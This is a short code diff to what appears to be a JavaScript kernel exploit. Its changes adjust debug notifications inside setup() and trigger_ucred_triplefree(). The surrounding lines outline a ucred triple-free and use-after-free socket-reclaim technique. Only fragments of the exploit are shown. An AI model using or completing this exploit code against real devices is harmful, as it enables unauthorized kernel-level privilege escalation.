@@ -684,7 +684,6 @@ var prev_rtprio = -1;
 var cleanup_called = false;
 function setup() {
   try {
-    send_notification('SETUP: entered');
 
     debug('Preparing netctrl...');
 
@@ -1486,14 +1485,18 @@ function trigger_ucred_triplefree() {
     // 2) allocate new ucred
     setuid(1);
 
-    send_notification("[T] before reclaim_uaf");
     // 3) reclaim fd → uaf_socket
+    send_notification("[T] before_reclaim_uaf");
     var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[T] after_reclaim_uaf");
+    send_notification("[T] after_reclaim_uaf_call");
+    send_notification("[T] tmp_sock_raw=" + tmp_sock.toString());
+    
     if (tmp_sock.eq(BigInt_Error)) {
       log("[TRIGGER] uaf_socket error, retry");
       continue;
     }
+    send_notification("[T] tmp_sock_type=" + typeof tmp_sock);
+send_notification("[T] tmp_sock_value=" + tmp_sock.toString());
     uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
 
     // 4) free previous ucred
